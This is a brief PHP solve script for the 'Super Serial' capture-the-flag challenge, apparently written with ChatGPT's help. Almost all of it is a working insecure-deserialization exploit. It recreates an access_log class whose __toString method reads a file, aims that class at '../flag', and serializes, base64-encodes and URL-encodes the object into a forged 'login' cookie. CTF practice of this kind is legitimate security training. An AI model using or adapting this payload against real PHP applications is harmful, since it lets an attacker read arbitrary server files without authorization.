/*
Solve script for Super Serial.
Written with the help of ChatGPT.
*/

<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

// Create the object with the target credentials
$malicious = new access_log("../flag");

// Serialize, base64 encode, and urlencode
$cookie = urlencode(base64_encode(serialize($malicious)));

// Output the result
echo "Malicious cookie value:\n";
echo "login=" . $cookie . "\n";

?>
